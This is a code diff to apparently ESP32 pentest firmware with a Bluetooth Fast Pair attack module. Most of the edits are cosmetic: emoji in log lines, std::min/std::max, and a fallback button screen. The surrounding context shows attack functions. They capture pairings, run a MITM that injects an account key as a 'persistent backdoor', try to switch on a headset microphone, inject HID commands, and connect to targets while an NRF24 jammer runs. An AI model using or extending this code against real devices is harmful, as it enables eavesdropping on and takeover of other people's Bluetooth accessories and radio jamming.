@@ -7,6 +7,7 @@
 #include "core/utils.h"
 #include "esp_mac.h"
 #include "modules/NRF24/nrf_jammer_api.h"
+#include <algorithm>
 
 extern std::vector<String> fastPairDevices;
 extern bool returnToMenu;
@@ -43,13 +44,13 @@ class PairingCaptureCallback : public NimBLEScanCallbacks {
                 uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                 
                 if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
-                    Serial.printf("\n Found FastPair device: %s\n", 
+                    Serial.printf("\n📡 Found FastPair device: %s\n", 
                                   advertisedDevice->getName().c_str());
                     
                     if(mfg.length() >= 4) {
                         uint8_t msg_type = mfg[2];
                         if(msg_type == 0x00) {
-                            Serial.println("Phone detected!");
+                            Serial.println("📱 Phone detected!");
                             g_capturedPhoneAddr = advertisedDevice->getAddress();
                         } else if(msg_type == 0x10 || msg_type == 0x20) {
                             Serial.println("🎧 Target detected!");
@@ -148,7 +149,7 @@ void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, u
     int yPos = 60;
     int lineHeight = 20;
     int maxLines = 8;
-    for(int i = 0; i < min((int)lines.size(), maxLines); i++) {
+    for(int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
         tft.setCursor(20, yPos);
         String displayLine = lines[i];
         if(displayLine.length() > 35) {
@@ -275,7 +276,63 @@ int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2
         }
     }
     else {
-        return displayMessage(line1, btn1, btn2, btn3, color);
+        // Simple fallback for 2+ buttons (if displayMessage doesn't exist)
+        tft.fillScreen(bruceConfig.bgColor);
+        drawMainBorderWithTitle("SELECT");
+        tft.setTextColor(color, bruceConfig.bgColor);
+        tft.setCursor(20, 70);
+        tft.print(line1);
+        
+        int btnWidth = 80;
+        int btnHeight = 35;
+        int btnY = 150;
+        int8_t result = -2;
+        
+        if(strlen(btn1) > 0) {
+            tft.fillRoundRect(50, btnY, btnWidth, btnHeight, 5, bruceConfig.priColor);
+            tft.setTextColor(TFT_WHITE, bruceConfig.priColor);
+            tft.setCursor(60, btnY + 12);
+            String btn1Str = btn1;
+            if(btn1Str.length() > 8) btn1Str = btn1Str.substring(0, 5) + "...";
+            tft.print(btn1Str);
+        }
+        
+        if(strlen(btn2) > 0) {
+            tft.fillRoundRect(150, btnY, btnWidth, btnHeight, 5, bruceConfig.secColor);
+            tft.setTextColor(TFT_WHITE, bruceConfig.secColor);
+            tft.setCursor(160, btnY + 12);
+            String btn2Str = btn2;
+            if(btn2Str.length() > 8) btn2Str = btn2Str.substring(0, 5) + "...";
+            tft.print(btn2Str);
+        }
+        
+        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+        tft.setCursor(20, 200);
+        if(strlen(btn3) > 0) {
+            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
+        } else {
+            tft.print("SEL: Btn1  NEXT: Btn2  ESC: Back");
+        }
+        
+        while(true) {
+            if(check(EscPress)) {
+                delay(200);
+                return -1;
+            }
+            if(check(SelPress)) {
+                delay(200);
+                return 0;
+            }
+            if(check(NextPress)) {
+                delay(200);
+                return 1;
+            }
+            if(strlen(btn3) > 0 && check(PrevPress)) {
+                delay(200);
+                return 2;
+            }
+            delay(50);
+        }
     }
 }
 
@@ -713,7 +770,7 @@ String selectTargetFromScan(const char* title) {
         return a.rssi > b.rssi;
     });
     
-    const int maxDevices = min((int)devices.size(), 6);
+    const int maxDevices = std::min((int)devices.size(), 6);
     int selectedIdx = 0;
     bool exitLoop = false;
     
@@ -831,7 +888,7 @@ bool captureLivePairing(const char* scanName) {
         }
         
         if(gotPhone && gotTarget) {
-            Serial.println("\n Both devices detected!");
+            Serial.println("\n✅ Both devices detected!");
             break;
         }
         
@@ -949,7 +1006,7 @@ bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
             delay(100);
             std::string ack = pAccountChar->readValue();
             if(ack.length() > 0) {
-                Serial.println("ACCOUNT KEY INJECTED!");
+                Serial.println("✅ ACCOUNT KEY INJECTED!");
                 memcpy(keys.account_key, account_key, 16);
                 keys.keys_captured = true;
                 showSuccessMessage("PERSISTENT BACKDOOR INSTALLED!");
@@ -961,7 +1018,7 @@ bool performMITMAttack(NimBLEAddress target, CapturedKeys& keys) {
     NimBLEDevice::deleteClient(pTargetClient);
     
     if(keys.keys_captured) {
-        Serial.println("\n MITM SUCCESSFUL!");
+        Serial.println("\n🎯 MITM SUCCESSFUL!");
         return true;
     }
     
@@ -984,7 +1041,7 @@ bool activateMicrophoneHijack(NimBLEAddress target) {
         if(pAudioChar && pAudioChar->canWrite()) {
             uint8_t enable_mic[] = {0x01, 0x00};
             if(pAudioChar->writeValue(enable_mic, 2, true)) {
-                Serial.println("Microphone access attempted");
+                Serial.println("⚠️  Microphone access attempted");
                 showWarningMessage("MIC ACCESS ATTEMPTED");
             }
         }
@@ -1026,7 +1083,7 @@ bool simulateHIDKeyboard(NimBLEAddress target) {
                         uint8_t media_play[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                         
                         if(pChar->writeValue(media_play, 8, false)) {
-                            Serial.println("HID command sent");
+                            Serial.println("⚠️  HID command sent");
                             showWarningMessage("HID COMMAND INJECTED");
                         }
                     }
@@ -1066,11 +1123,11 @@ bool checkBackdoorAccess(NimBLEAddress target) {
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService) {
-        Serial.println("FastPair service accessible");
+        Serial.println("✅ FastPair service accessible");
         
         NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
         if(pChar && pChar->canWrite()) {
-            Serial.println("Can write to KBP characteristic!");
+            Serial.println("✅ Can write to KBP characteristic!");
             showSuccessMessage("BACKDOOR ACTIVE!");
             pClient->disconnect();
             NimBLEDevice::deleteClient(pClient);
@@ -1108,7 +1165,7 @@ bool jamAndConnectEnhanced(NimBLEAddress target) {
         if(connectWithRetry(target, 1, &tempClient)) {
             connected = true;
             pClient = tempClient;
-            Serial.println("Connected while jamming!");
+            Serial.println("✅ Connected while jamming!");
             break;
         }
         
@@ -1456,7 +1513,7 @@ void jamAndConnectMenu() {
                     }
                 } else {
                     selectedIdx = 8;
-                    scrollOffset = max(0, 8 - visibleItems + 1);
+                    scrollOffset = std::max(0, 8 - visibleItems + 1);
                 }
                 delay(200);
             }
